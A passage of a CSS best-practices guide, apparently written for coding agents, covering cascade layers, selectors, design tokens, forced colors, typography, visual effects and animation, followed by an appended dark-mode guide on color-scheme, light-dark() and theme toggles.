   4. [Theming browser-generated UI](#theming-browser-generated-ui)
6. [6. Responsive design](#6-responsive-design)
   1. [Responsive Typography](#responsive-typography)
7. [7. Typography](#7-typography)
   1. [Text wrapping](#text-wrapping)
8. [8. Visual effects](#8-visual-effects)
   1. [Depth and texture](#depth-and-texture)
   2. [Shapes](#shapes)
   3. [Gradients and `color-mix()`](#gradients-and-color-mix)
   4. [Patterns](#patterns)
9. [9. Transitions \& animations](#9-transitions--animations)
   1. [Performance](#performance)
   2. [Accessibility](#accessibility)
10. [10. Generated content](#10-generated-content)


## 1. Foundations

Be allergic to knowledge duplication. Prefer variables over repetition, but whenever possible, prefer built-in conventions such as:
- `currentColor` instead of defining a variable and setting `color` to it
- The `inherit` keyword instead of defining a variable on the parent and using it on the same property across parent and child.
- `em` units instead of `font-size: var(--size)`
- `cqw`/`cqh` (or their logical versions — `cqi`/`cqb`) units instead of repeating box model values.
- Code duplication is not knowledge duplication. The goal is robustness and maintainability, not saving characters.
- Prefer **logical properties and values** over physical ones (e.g. `margin-inline-start` instead of `margin-left`) so that styles adapt to different writing modes and orientations. Even if the page author does not plan to localize, external translation tools often display translated text in context.
- Do not use logical properties indiscriminately — ask yourself "would I want this to flip in RTL?" — if the answer is no, use the physical property instead.
- Consider different viewing modes (dark mode, high contrast mode), different viewport sizes, and different input modes (touch, keyboard, pointer).

## 2. Inheritance and The Cascade

**Avoid** introducing BEM naming conventions to manage specificity.
Instead, use modern CSS features such as cascade layers and `:where()` to make cascade behavior predictable and follow author intent.

Use cascade layers (`@layer`) to define explicit priority zones (e.g., `reset`, `base`, `theme`, `components`, `utilities`), and declare their order upfront (e.g. `@layer reset, base, theme, components, utilities;`).
Within each layer, use `:where()` to make selectors only compete based on meaningful signals, not incidental filters (`:not()` edge cases, remote ancestors, etc.) or for one-off easily overridable defaults.

Use keywords like `inherit`, `initial`, `unset`, or `revert` instead of explicit values to improve maintainability and better express intent.
Examples:
- When specifying a transition on a child that should match the parent's `transition-*` properties, instead of repeating the transition properties on the child, use `transition: inherit` (reduce duplication, improve maintainability)
- Use `initial` to reset a property to its initial value instead of specifying the value explicitly (clearer expression of intent)

## 3. Selectors and scoping

Modern browser-native selectors reduce the need for preprocessors and complex state-tracking in JS.

### Prefer CSS selectors over JS for complex element targeting

- **DO** use `:has()` to style parents based on child state instead of managing classes in JS (e.g. `label:has(:checked)` instead of a manual `label.has-checked` class) For more information, see the guides at `child-state-based-styling` (via `npx -y modern-web-guidance@latest retrieve "child-state-based-styling"`) and `content-based-styling` (via `npx -y modern-web-guidance@latest retrieve "content-based-styling"`).
- **DO NOT** nest `:has()` or use pseudo-elements inside it (browser API limitation)
- Use `:nth-child(<An+B> of <selector>)` when you need to style every n-th element of a certain type. E.g. `details:nth-child(1 of [open])` will style the first open `<details>` element it finds, whereas `details[open]:first-child` would style only the first child if and only if it was open.

### Use `:is()` (or `:where()`) instead of CSS rule duplication for fallbacks

**DO NOT** duplicate CSS rules to provide fallbacks for pseudo-classes that may not be supported — use `:is()` or `:where()` instead and take advantage of their forgiving parsing rules.

```css
/* BAD: duplicate rules instead of using `:where()` */
[popover]:popover-open {
  /* styles for native popovers */
}
[popover].\:popover-open {
  /* same styles again, for polyfilled popovers */
}

/* GOOD */
[popover]:where(:popover-open, .\:popover-open) {
  /* same styles in one rule */
}
```

Do NOT use this for pseudo-elements, as they are not supported in `:is()` or `:where()`.

### Avoid overmatching

Write selectors in a way that expresses _intent_.

#### Use `:not()` instead of overrides to exclude irrelevant states/targets

When the intent is to exclude certain states or elements that are fundamentally irrelevant, use `:not()`.

For example, to apply bottom borders between list items, don't do this:

```css
.fancy-list li {
  border-bottom: 1px solid silver;
}

.fancy-list li:last-child {
  border-bottom: none;
}
```

This can unintentionally overwrite a desirable `border-bottom` set from another rule.
The actual intent was to only apply the bottom border to the non-last `li`s. The code above is a workaround that poorly expresses this intent. Instead, this expresses intent more clearly:

```css
.fancy-list li:not(:last-child) {
  border-bottom: 1px solid silver;
}
```

Similarly, don't do this:

```css
button:hover {
  background: var(--color-blue);
}

button:disabled {
  background: var(--color-neutral);
}
```

If we reorder the two rules, we will get a hover background on disabled buttons!
Instead, do this:

```css
button:hover:not(:disabled) {
  background: var(--color-blue);
}

button:disabled {
  background: var(--color-neutral);
}
```

This works regardless of reordering, as the first rule does not overmatch.

#### Prefer `@scope` over `:not()` for excluding (potentially deeply nested) subtrees

While `:not()` + descendant selectors can exclude subtrees, this works poorly for deeply nested structures.
For example, `.card :not(.content *)` will not work as expected for nested cards.
`@scope` fixes this as it takes hierarchical proximity into account:

```css
@scope (.card) to (.content) {
  /* styles for elements inside .card but not inside .content */
}
```

This will work as expected even for nested cards.

#### Overrides are fine for specialization

This is fine:

```css
button {
  background: var(--color-neutral);
}

button.primary {
  background: var(--color-blue);
}
```

Both rules express legitimate _intent_: buttons are generally neutral, but primary ones are blue.

#### No global resets

**DO NOT** use global resets (styles on `*`) as they cannot be overridden by web components or lower-priority cascade layers (without `!important`). Instead, apply reset styles to specific element types and/or conditions.

### Nesting and scoping

Use native CSS nesting to group related styles to the extent it improves maintainability and readability.

Prefer `@scope` over nesting when proximity should matter more than pure specificity. This is common in selectors that can be nested in any order, but the closest matching one (in element -> ancestor order) should win, e.g. theming classes.

For example this will not work as expected:
```css
.dark .invert { color-scheme: light }
.light .invert { color-scheme: dark }
```

If `.invert` is nested within _both_ `.dark` and `.light`, it will always resolve to dark mode as both rules have the same specificity.
Using `@scope` fixes this:

```css
@scope (.dark) {
  .invert { color-scheme: light }
}

@scope (.light) {
  .invert { color-scheme: dark }
}
```

## 4. Interactivity

### Focus management

- Use `:focus-visible` to define custom focus rings, not `:focus`.
- Do not remove the browser's default focus rings (via `outline: none`) without providing an alternative visible focus style.
- Prefer `outline` over other properties (e.g. `box-shadow`) for focus rings. If you must rely on `box-shadow` for focus rings, provide an `outline`-based fallback for High Contrast Mode using the `forced-colors` media query.
- Pair focus outlines with `outline-offset` to visually separate the ring from the element.

### Touch targets

- Interactive elements should be at least 24×24 CSS pixels (WCAG 2.5.8 AA). Enforce with `min-block-size` / `min-inline-size` or padding rather than `width` / `height`, so content can grow the target but not shrink it.
- Bump targets up on coarse pointers: `@media (pointer: coarse) { ... }`.
- **DON'T** use `touch-action: none` for custom gestures — it disables page scrolling through the element. Scope to the axis you actually need: `pan-y` for horizontal swipes (page still scrolls vertically), `pan-x` for vertical ones. Reserve `none` for elements where no native touch behavior makes sense (e.g. a drawing canvas).

## 5. Design Tokens and Theming

Use CSS custom properties on `:root` to define core design variables (colors, fonts, sizes, etc) used throughout the design, for visual consistency and to scale UI design across teams.
**DO NOT** specify nontrivial styling values inline. E.g. `background: transparent` or `padding: 0` is ok, but `background: #f06` or `padding: .3em` are not.
One exception is use cases where keeping code small and simple is far more important than long-term maintainability and evolution, such as testcases.

Typically these are organized in tiers, with each tier building upon the previous one. For example:
1. Tier 1: Literal design tokens (e.g. `--color-blue-10`, `--color-gray-90`, `--font-sans-serif`, `--size-xl` etc)
2. Tier 2: Semantic design tokens (e.g. `--color-accent`, `--color-neutral`, `--font-body`, `--font-heading` etc)
3. Tier 3: General UI design tokens (e.g. `--ui-border`, `--surface-bg-subtle` etc)
4. Tier 4: Component-specific design tokens (e.g. `--button-bg-primary-hover`, `--button-border-color-secondary` etc)

The smaller the scope of the use case, the fewer tiers it needs. E.g. a quick demo or toy app are fine with one tier. Do not overengineer.
Check for any existing conventions around naming and levels before inventing your own.

### Dark mode

- Use `color-scheme: light dark` on `:root` to enable dark mode support that automatically adapts to the system setting. You can also specify `color-scheme` on individual elements to force a different value for that subtree (`light`/`dark` or `light dark` for the system default)
- Use `light-dark()` to provide alternatives that automatically resolve based on the element's `color-scheme`.
Typically this happens in Tier 2 or Tier 3 tokens.
- IMPORTANT: When using `light-dark()` on an inherited `<color>` property, it will resolve to a specific color based on that element's `color-scheme` and inherit as that resolved color, not as a `light-dark()` value. It will NOT adapt to any descendant-specific `color-scheme` overrides. To keep `light-dark()` color tokens dynamic resolve them as late as possible by only passing them around as unregistered custom properties and avoid relying on inherited color values across `color-scheme` boundaries.

See `dark-mode` (via `npx -y modern-web-guidance@latest retrieve "dark-mode"`) for tips & best practices on supporting dark mode switching and `component-specific-light-dark-theme` (via `npx -y modern-web-guidance@latest retrieve "component-specific-light-dark-theme"`) for more on applying different `color-scheme` modes than the page-wide setting on certain elements.

### Forced Colors Mode

In Forced Colors Mode (High Contrast on Windows), the browser overrides author colors with system keywords and strips `background-image`, `box-shadow`, and `border-image`.

- Define system color fallbacks for color tokens using `@media (forced-colors: active)`.
- **DON'T** rely on `background-image`, `box-shadow`, or `border-image` to convey borders, separators, or state — they disappear in forced colors (and often in print too). If you must, ensure there's an alternative in forced colors mode, such as `outline` or `border` with system color keywords (`CanvasText`, `LinkText`, `ButtonText`, `Highlight`, `GrayText`, etc.).
- Use `forced-color-adjust: none` where color is essential information (syntax highlighter, color picker swatch). **DON'T** use `forced-color-adjust: none` just to preserve aesthetics.


### Generating tints

Before generating tints dynamically, check if you can use an existing, predefined, design token. This allows much more designer control and ensures consistency.

If you need to generate lighter or darker colors dynamically:
- **DO NOT** just adjust the lightness channel in `oklch`/`oklab` or `lch`/`lab`, e.g. `oklab(from var(--primary) 0.9 a b)`. While that is theoretically the correct way, browsers do not yet implement gamut mapping, so the resulting color is unpredictable.
- You can use `color-mix()` to mix with white or black (preferably in `oklab`). This keeps the color safely in gamut, but tends to over-desaturate colors and produce washed out tints and shades.
- You MAY combine lightness adjustment with any of the other methods (e.g. `color-mix(in oklab, oklch(from var(--primary) 0.9 c h), white 30%)`) for a balance between the two, but avoid going above 30% for the lightness adjustment.

### Theming browser-generated UI

Most browser-generated UI can be customized to some extent using CSS.
Even if it requires modern features, it degrades gracefully in older browsers, and thus often does not require a polyfill or fallback.

Before re-creating browser UI (form controls, scrollbars, selections, error messages, etc), first verify that:
1. the browser UI cannot be customized enough for your needs, even with modern CSS,
2. the desired customization is sufficiently critical to justify the tradeoffs of re-creating built-in UI — most notably losing accessible semantics, keyboard handling, IME, and AT integration that the native UI provides for free.

Example customizations that are possible:
- Use `::selection` to customize highlighted text colors.
- **DON'T** apply `user-select: none` to content text — breaks copy-paste, translation tools, and AT "read from here" gestures. Limit it to chrome (drag handles, toolbars, redundant button labels).
- Use `accent-color` to apply the page's accent color to any browser-generated UI.
- Use `color-scheme` to have browser UI adapt to light/dark mode.
- Use `scrollbar-color` to customize scrollbar colors and `scrollbar-width` to control scrollbar thickness — keep the thumb visibly distinct from the track (≥3:1), and don't set `scrollbar-width: none` on scrollable regions (use it only when scrolling is fully replaced by another affordance).
- Use `:user-invalid` / `:user-valid` for validity styling, **not** `:invalid` / `:valid` — they only match after the user has interacted with the field, avoiding the hostile default of flagging required-empty fields as errors on page load.
- Buttons and text fields (including `<textarea>`) can generally be styled as normal elements.
- Use `font-size` to scale and other textual properties to control typography

#### Styling textual fields (`<input>` & `<textarea>`)

For most styling purposes (e.g. colors, borders, backgrounds, typography, etc) treat these elements as normal text containers.

- Use `:placeholder-shown` and `::placeholder` to style input placeholders.
- Use `field-sizing: content` to make text fields size to content.
- For `<textarea>` elements, use `resize: vertical` to disable horizontal resizing or `resize: none` to disable all resizing.

#### Multiple choice controls (select, radios, checkboxes)

- To select one among many options presented in a dropdown: Use a `<select>` + `appearance: base-select` + `::picker(select)`. For more info see `branded-select-styling` (via `npx -y modern-web-guidance@latest retrieve "branded-select-styling"`)
- Selecting one or more among multiple options laid out inline in the page: Use a `<input type=checkbox>` or `<input type=radio>` inside a `<label>` for each option. Style via `label:has(:checked)`.
- Style checkboxes, radios and switches via `appearance: none` + generated content (`::before`/`::after`) or background images to draw the checked state.
<!-- Customizable select listbox version currently buggy + this has much better browser support -->

#### Non-textual `<input>`s (buttons, sliders, file inputs etc.)

- File inputs: Use `::file-selector-button` to style the button.
- Do not use `<input>` with a `type` of `button`, `submit` or `reset`. Use `<button>` instead and style it as a regular element.
- Sliders: Use `appearance: none` + thumb pseudo-elements (`::-webkit-slider-thumb`, `::-moz-range-thumb`, etc) and track pseudo-elements (`::-webkit-slider-runnable-track`, `::-moz-range-track`, etc) for more granular control.

## 6. Responsive design

- Use `@container` queries to create component-driven responsive layouts that adapt to their parent container's size rather than the viewport.
- Use dynamic viewport units (`dvh`, `dvw`) instead of `vh`/`vw` to prevent layout breakage when mobile browser UI elements (like address bars) appear or disappear.
- Use `aspect-ratio` for media elements (like `<img>` and `<video>`) to reserve space during loading and prevent Cumulative Layout Shift (CLS).

### Responsive Typography

- **DO** combine viewport-relative and font-relative units in `clamp()` for font sizes that scale with the viewport size while ensuring they stay within a desired range. For example, `clamp(2rem, 1rem + 5vw, 4rem)`. Adjust the proportion of viewport-relative and font-relative units to control how quickly the font-size changes.
- **DON'T** use `vw` alone for font-size without `clamp()`, as it can scale text too small or too large on extreme screens.

## 7. Typography

- Use unitless numbers for `line-height` (e.g., `1.5`) to ensure relative scaling during font-size inheritance.
- Use `overflow-wrap: break-word` (or `anywhere`) to contain long URLs.
- **DON'T** use `px` for font-size. Prefer `rem` to honor the user's browser font-size preferences (root font size), or `em` for contextual sizing.

### Text wrapping

- Use `text-wrap: balance` for balanced headlines and headline-like content (e.g. `<th>`)
- Use `text-wrap: pretty` for long-form body text (paragraphs, blockquotes, etc.)
- Use `text-wrap: balance` or `text-wrap: pretty` deliberately, **DO NOT** apply it on `*` as it does have a performance cost.
- Avoid `text-wrap: balance` on elements with a visible box (backgrounds, borders, shadows, etc) as it does not change the container's width, it only affects how text wraps *within* that width. This can leave empty space at the end of the container, which is usually undesirable.

## 8. Visual effects

### Depth and texture

- Layer multiple shadows for realistic soft depth effects.
- Use `filter: drop-shadow()` instead of `box-shadow` for non-rectangular shapes or transparent PNGs.
- Use `mix-blend-mode` and `background-blend-mode` for lighting overlays (limit scope with `isolation: isolate`)

```css
.hero {
  background-image: url('texture.png'), linear-gradient(to bottom, #fff, #eee);
  background-blend-mode: soft-light;
}
```

### Shapes

- Use `corner-shape: squircle` for more aesthetically pleasing curves as a progressive enhancement over regular rounded corners.
- Use elliptical `border-radius` (e.g., `10px / 20px`) for proportional curves without extra elements.

### Gradients and `color-mix()`

Use `in oklch` or `in oklab` to explicitly specify the interpolation color space for gradients or `color-mix()`.
- `in oklch` preserves chroma better, but can more easily get out of device gamut, especially for bigger differences between colors
- `in oklab` stays in gamut more easily (assuming in-gamut endpoints) but can create washed out desaturated colors in the middle, especially when interpolating between opposite hues.
- *DON'T* use `in srgb` unless you have a specific reason to do so (e.g. you are building a color picker that needs to interpolate in srgb).

#### Fallback

Some pre-2024 browsers do not support gradient color interpolation space.
To support these browsers, use the token only when its usage is safe by defining a variable:

```css
:root {
  --in-oklab: ;
  --in-oklch: ;
}

@supports (linear-gradient(in oklab, white, black)) {
  :root {
    --in-oklab: in oklab;
    --in-oklch: in oklch;
  }
}
```

Then use like:

```css
.card {
  background: linear-gradient(to bottom var(--in-oklab), var(--accent-color), var(--darker));
}
```

- **Important:** If you use this technique, make sure there is always a non-empty gradient preamble without it, otherwise it will be a syntax error in older browsers.
- You do NOT need this for `color-mix()`. If a browser supports `color-mix()`, it also supports its `in <color-space>` argument.

### Patterns

Many patterns can be created via CSS gradients + hard stops, and these can be more flexible and performant than SVGs or external images as they can have access to CSS variables and lengths from the surrounding context.
You don't need to repeat the position twice — just use `0` or `0%` and gradient fixup will auto-adjust it.

Examples below.

Vertical stripes of `1em` width each:

```css
background: linear-gradient(to right, var(--color-1) 50%, var(--color-2) 0) 0 / 2em;
```

Diagonal stripes of `1em` width each:

```css
background: repeating-linear-gradient(-45deg, var(--color-1) 0 1em, var(--color-2) 0 2em);
```

Checkerboard pattern with `1em` squares:

```css
background: repeating-conic-gradient(var(--color-1) 0 25%, var(--color-2) 0 50%) 0 / 2em 2em;
```

Polka dot with `.5em` radius dots spaced `2em` apart (horizontally/vertically — multiply by `sqrt(2)` for diagonal distance):

```css
--distance: 2em;
--radius: .5em;
--polka: radial-gradient(circle, var(--color-1) var(--radius), transparent calc(var(--radius) + 1px));
background: var(--polka) 0 0, var(--polka) var(--distance) var(--distance) var(--color-2);
background-size: calc(var(--distance) * 2) calc(var(--distance) * 2);
```

Simple pie chart:

```css
.pie {
  --p: 80%;
  width: 60px;
  aspect-ratio: 1;
  border-radius: 50%;
  background: conic-gradient(var(--color-1) var(--p), transparent 0%) var(--color-2);
}
```

**Important:** When using gradients to render charts, ensure there is a textual fallback for screen readers. MANDATORY: You MUST provide a semantic data table as an accessible alternative, as detailed in `accessibility` (via `npx -y modern-web-guidance@latest retrieve "accessibility"`) under the alternate text and media guidelines.

## 9. Transitions & animations

- Use `clip-path` and `mask-image` for custom geometric reveals and smooth fade-outs.
- Use **Scroll-Driven Animations** (`animation-timeline: scroll()`) for non-essential scroll-bound effects instead of JS listeners.
- Use **View Transitions** to animate between complex layout states seamlessly.

### Performance

Rendering performance is critical for smooth user experiences, especially in heavy DOM trees.

- Prefer to animate `opacity` and `transform` (including individual transform properties, e.g. `translate` instead of `left/right/top/bottom`) to ensure animations stay on the compositor thread.
- Use `transition-behavior: allow-discrete` + `@starting-style` to animate layout properties like `display` or `<dialog>` state natively.
- Always pair `content-visibility` with `contain-intrinsic-size` to prevent scrollbar jumps (CLS).
- When setting `contain-intrinsic-size` use the `auto` keyword and a value that’s derived from what is known about the contents (i.e. text size, spacing, size of graphics, character count). Preferably use units such as `rem`, `lh`, `cap`, or `ch` that match values used for the elements within the contents rather than `px`. If the content for items in a group is not consistently sized, then use an average size.
- Use `contain: layout style paint` to isolate component rendering updates.

#### Code Example: Render Optimization

```css
.large-section {
  content-visibility: auto;
  contain-intrinsic-block-size: auto 800px;
}

.row {
  --row-gap: .4rem;
  --title-height: 1lh;
  --description-height: 0.85lh;

  display: grid;
  row-gap: var(--row-gap);
  content-visibility: auto;
  /* The sum of the title height, row gap, and description height should be the size of the contents when skipped for rendering. */
  contain-intrinsic-block-size: auto calc(var(--title-height) + var(--row-gap) + var(--description-height));
}

.popover-reveal {
  /* Allow discrete animations for display transitions */
  transition: display 0.2s allow-discrete;
}
```

### Accessibility

Use `prefers-reduced-motion` media queries to turn off heavy motion for users who prefer it.

**DO NOT** globally apply `animation-duration: 0.01ms;` globally as it can cause certain animations to become _more_ jarring.
Either apply reduced motion versions on a case by case basis, or use a custom property like:

```css
@property --animation-reduced {
  syntax: "*";
  inherits: false;
  initial-value: none;
}

@media (prefers-reduced-motion: reduce) {
  * {
    animation: var(--animation-reduced) !important;
  }
}
```

Then, reduced motion versions can be kept together with the original animations:

```css
progress:not([value]) {
  animation: slide 1s infinite linear;
  --animation-reduced: slide 20s infinite linear;
}
```

## 10. Generated content

- **DON'T** use `content` to convey meaningful text (labels, state, instructions) — keep that in the DOM (WCAG F87). The alt text argument is harm reduction for cases where decoration accidentally carries meaning, not a license.
- Use the alternative text argument of `content` to provide alt text for screen readers. E.g. `content: url(cloud.svg) / "Save";`
- Use `content: "text" / "";` to prevent purely decorative text from being announced to screen readers.
- **DON'T** use an empty alt text argument for images — they're already presentational by default. E.g. this is wrong: `content: url(cloud.svg) / "";`.
- **DON'T** use the alt text argument to describe emojis unless the description differs from the official emoji name. E.g. don't do `content: "🎉" / "celebration";`, but `content: "🎉" / "Yay!";` is fine.

**ONLY** use the alt text argument when the text is different than the primary value and is not already present in the DOM. I.e. this is wrong:

HTML:
```html
<button class="save">Save</button>
```

CSS:
```css
button.save::before {
  content: url(cloud.svg) / "Save";
}
```

A screen reader would read it out as "Save save".


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_DARK-MODE.MD

# Dark mode
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The `color-scheme` property indicates which color schemes (such as light or dark) your page supports. This informs the browser that it can automatically theme native UI elements—like scrollbars, form controls, and the default canvas background—to match your site's design and help minimize white flashes during initial loading.

## Implementation

### 1. Declare supported schemes in HTML

MANDATORY: To help prevent a "flash of un-themed content" (FOUC), place a `<meta>` tag in your `<head>` to ensure the browser knows which themes you support before it even starts rendering. While this `<meta>` tag helps to avoid FOUC by setting the initial canvas color early, it may not completely eliminate flashes in all browsers or loading conditions.

```html
<!-- MANDATORY: Declare support for both light and dark themes -->
<meta name="color-scheme" content="light dark">
```

### 2. Apply page-wide color scheme to CSS :root or html

MANDATORY: Apply the `color-scheme` property to the `html` element or the `:root` pseudo-class. Browsers specifically look to the root element to determine the theme for the entire viewport—including the root scrollbars and the initial "canvas" background. If applied only to the `body`, these global UI surfaces may remain in light mode because the `body` does not control the window's rendering context.

```css
/* MANDATORY: Apply color-scheme to :root or html for viewport-wide theming */
:root {
  /* MANDATORY: Automatically adapt native UI to user system preferences */
  color-scheme: light dark;
}
```

### 3. Define light and dark color tokens

You can use the `light-dark()` function to define color tokens that automatically adapt to different `color-scheme` values.

It is recommended that you also keep the raw color values in separate custom properties, which makes it easier to combine them in different ways (and makes fallback behavior easier, if needed).

For more control over the colors of built-in UI such as `accent-color` or `scrollbar-color`, authors **can optionally** add their own dynamic colors with use of custom properties and/or the `light-dark()` function. This function automatically picks the correct color based on the computed `color-scheme` of the element and eliminates the need for redundant media queries, but is not required for a basic implementation.

```css
:root {
  --color-brand-light: oklch(45% 0.23 270);
  --color-brand-dark: oklch(85% 0.15 210);
  --color-brand-text-light: white;
  --color-brand-text-dark: oklch(40% 0.23 270);

  --color-brand: light-dark(var(--color-brand-light), var(--color-brand-dark));
  --color-brand-text: light-dark(var(--color-brand-text-light), var(--color-brand-text-dark));

  /* MANDATORY: Automatically adapt native UI to user system preferences */
  color-scheme: light dark;
}

button.primary {
  /* These automatically adapt to color scheme */
  background-color: var(--color-brand);
  color: var(--color-brand-text);
}
```

OPTIONAL: A number of system colors are available, which also automatically adapt to the used color scheme (and other color modes, e.g. forced colors), such as `canvas`, `canvastext`, `accentcolor` (check support) , `buttonborder` etc. These are typically too limited to be useful, beyond very specific cases where you need to exactly match certain default browser UI or as fallbacks/defaults.

#### OPTIONAL: Tailor color pairs to context

Even when overriding the system default, it can be useful to use the `prefers-color-scheme` media query to define **different** color pairs that take into account the colors of the browser and OS chrome around the page (or of the surrounding page, when the page is used as an iframe).

For example, use a slightly dimmer light theme when the system setting is `dark`, or a more contrasting dark theme when the system setting is `light`, so the page is not visually overpowered by the surrounding UI.


## Fine-grained browser UI customization

Setting `color-scheme` already adapts browser UI to the used color scheme, but this will use OS defaults and/or system colors that may not perfectly align with the website design.
Modern browsers expose several fine-grained customization hooks for these.
Do not reimplement native controls simply to customize their appearance without exhausting the customization hooks modern browsers provide.

### Setting the accent color

Some browser UI (e.g. checked checkboxes or sliders) uses an accent color.
This resolves to the OS setting by default, but you can use the `accent-color` property to set it to a color that better aligns with the page, such as the page's brand color.

```css
html {
  accent-color: light-dark(var(--color-accent-light), var(--color-accent-dark));
}
```

### Issues to be aware of when using accent-color

- When placing visual elements over the accent color (e.g. a checkbox checkmark), Chrome and Safari will automatically select a contrasting color, whereas Safari will modify the accent color, and may not maintain adequate contrast.

### Scrollbar colors

You can use `scrollbar-color` together with `light-dark()` to set custom scrollbar colors that adapt to the color scheme used.

```css
:root {
  --color-scrollbar-track: light-dark(#eee, #222);
  --color-scrollbar-thumb: light-dark(#999, #666);
  scrollbar-color: var(--color-scrollbar-thumb) var(--color-scrollbar-track);
}
```

### Issues to be aware of when using scrollbar-color

- Do NOT animate or transition `scrollbar-color`. A [WebKit bug](https://bugs.webkit.org/show_bug.cgi?id=311752) causes the scrollbar to flicker every time `scrollbar-color` changes.
- On macOS, `scrollbar-color` (standard) and `::-webkit-scrollbar` (legacy) properties are ignored by default because macOS uses native "overlay" scrollbars. You MUST pair custom colors with `scrollbar-width` (e.g., `thin` or `auto`) to force macOS to render them.
- Even with `scrollbar-width` applied, macOS overlay scrollbars render the track (gutter) as transparent by default. If the design requires a visible track background color on MacOS, you MUST apply `scrollbar-gutter: stable;` to the scrollable container, but note that it only appears after the user hovers over the scrollbar.
- Even with `scrollbar-gutter: stable` the track may be transparent on MacOS. The thumb should not depend on the track color to be visible.

### Further customization

Most browser UI exposes pseudo-elements to fully customize its appearance, such as:
- `::placeholder`
- `::spelling-error`
- `::grammar-error`
- `::selection`
- `::search-text`
- `::target-text`
- `::file-selector-button`

You can use `light-dark()` colors on any of these to apply colors that adapt to the used color scheme.

## OPTIONAL: Implementing a color-scheme toggle

**DO NOT** set `color-scheme: light` or `color-scheme: dark` on the root element by default.
The default color-scheme MUST be the user's system preference, which happens automatically when setting `color-scheme` to `light dark`.

For website-specific customization, a manual toggle could be provided to allow users to choose between light, dark, or system-default modes.

If a user-facing toggle to override it is desired, it should:
- Update the `<meta name="color-scheme">` element to reflect the chosen theme (`light dark` for system default, `light` for light, and `dark` for dark).
- If branching is desired for non-color values, set a class on `<html>` to match the theme preference and use descendant selectors. While `:root:has(> head > meta[name="color-scheme"][content="dark"])` would technically work, it is slower and confers no benefit, since we are already using JS to update the `<meta>` element.
- Persist user choice in `localStorage`.
- **IMPORTANT**: The CSS should be written to default to the system preference, with overrides for user-specified color-schemes. That way, if JS fails to execute, the site still defaults to the system color-scheme.
- The system-level OS theme can change at any time. If you are using JS to read `matchMedia("(prefers-color-scheme: dark)").matches`, you MUST also use `addEventListener("change", fn)` to react to changes. CSS automatically adapts to changes.
- **IMPORTANT**: To avoid a Flash of Unstyled Content (FOUC) for users who have pinned a different color scheme than their system default, use an inline script (NOT `type=module`, NOT `defer`) to set it when the page loads:

```html
<meta name="color-scheme" content="light dark">
<script>
{
  const colorScheme = localStorage.getItem("color-scheme");
  if (colorScheme) {
    document.querySelector('meta[name="color-scheme"]').content = colorScheme;
  }
}
</script>
```

### UX considerations

Use a two-state control:
1. System setting.
2. The opposite (e.g. light when the system setting is dark, and dark when the system setting is light). Selecting this setting must pin that exact color scheme, not a dynamically computed "opposite of system setting" value. Example scenario:
    1. The OS is set to light mode.
    2. The user selects the opposite setting for this website (dark).
    3. The user changes their system setting to dark.
    4. The website should remain dark.

**DON'T** expose all three states (system, light, dark). While the rationale is plausible — "Follow system (currently dark)" is a distinct user intent from "Always dark" — it provides suboptimal UX:
- Users cannot meaningfully express intent for problems they don't currently have. A manual toggle is a temporary comfort adjustment ("it's too bright right now"), not a long-term preference ("make sure this never changes").
- Two of the three options always produce the same visual result, violating the principle of feedback.

## Component-specific overrides

You can override the global theme for specific elements by setting `color-scheme` on them.
This is useful for "dark mode" sections within a light-themed site, such as code blocks or media players.

```css
pre, code {
  /* Forces element and its children to use dark themed UI */
  color-scheme: dark;
}
```

For more information about component-specific overrides and their gotchas, see `component-specific-light-dark-theme` (via `npx -y modern-web-guidance@latest retrieve "component-specific-light-dark-theme"`).

## Known issues to be aware of

### Issues to be aware of when using color-scheme

- Chrome and Firefox respect `color-scheme` for iframes: they render embedded pages in the correct color scheme and adjust the embedded page's `prefers-color-scheme` media query to reflect the embedding context's `color-scheme`. Safari does not, and resolves `prefers-color-scheme` to the system setting even inside iframes.
  - **If you control both parent and iframe:** pass the parent's color scheme to the iframe explicitly — via a URL parameter (`?theme=dark`) at iframe construction time, or via `postMessage()` (which also lets you react to runtime changes). In the iframe, set a class on `<html>` (and/or `color-scheme` on `:root`) from that signal instead of relying on `prefers-color-scheme`.
  - **If you only control the embedded page:** there is no reliable way to detect the embedding context's `color-scheme` from inside the iframe in Safari. Expose an explicit theme parameter on your embed API (e.g. a query string or `postMessage` protocol) and document it for embedders.

## Fallback strategies

### Fallbacks & browser support for color-scheme

Baseline status for color-scheme: Widely available. It's been Baseline since 2022-02-03.
Supported by: Chrome 98 (Feb 2022), Edge 98 (Feb 2022), Firefox 96 (Jan 2022), and Safari 13 (Sep 2019).

The `color-scheme` property is **progressive enhancement**.
Browsers that do not support it will ignore this property and use their default light-mode UI.

To adapt to the user's preferences in older browsers, use `prefers-color-scheme` media queries to provide different colors when dark mode is preferred.

- DO use the media query to switch custom properties on `:root` or `html`
- Avoid using the media query on individual components unless the component requires a very specific type of dark mode customization beyond colors.

```css
:root {
  /* Define brand colors for each mode */
  --color-brand-light: #0056b3;
  --color-brand-dark: #00e5ff;
  --color-brand: var(--color-brand-light);

  /* MANDATORY: Fallback for browsers without light-dark support */
  @media (prefers-color-scheme: dark) {
    --color-brand: var(--color-brand-dark);
  }

  /* Ignored in older browsers */
  color-scheme: light dark;
}

button.primary {
	background-color: var(--color-brand);
}
```

### Fallbacks & browser support for light-dark()

Baseline status for light-dark(): Newly available. It's been Baseline since 2024-05-13.
Supported by: Chrome 123 (Mar 2024), Edge 123 (Mar 2024), Firefox 120 (Nov 2023), and Safari 17.5 (May 2024).

For browsers that support `color-scheme` but not yet `light-dark()`, light and dark versions of colors should first be defined as custom properties, and the `prefers-color-scheme` media query should be used to set colors for the respective mode like in the example below:

```css
:root {
  /* Define browser UI accent color for each mode */
  --brand-accent-light: #0056b3;
  --brand-accent-dark: #00e5ff;
  --accent-color: var(--brand-accent-light);

  /* MANDATORY: Fallback for browsers without light-dark support */
  @media (prefers-color-scheme: dark) {
    --accent-color: var(--brand-accent-dark);
  }

  /* OPTIONAL: use light-dark() for more control of built-in UI colors */
  @supports (color: light-dark(white, black)) {
    --accent-color: light-dark(var(--brand-accent-light), var(--brand-accent-dark));
  }

  /* MANDATORY: Automatically adapt native UI to user system preferences */
  color-scheme: light dark;

  /* Example inherited color property */
  accent-color: var(--accent-color);
}

pre, code {
  color-scheme: dark;

  /* **Mandatory**: any inherited color properties must be set again, even if to the same design tokens */
  accent-color: var(--accent-color);
}
```

### Fallbacks & browser support for scrollbar-color

Baseline status for scrollbar-color: Newly available. It's been Baseline since 2025-12-12.
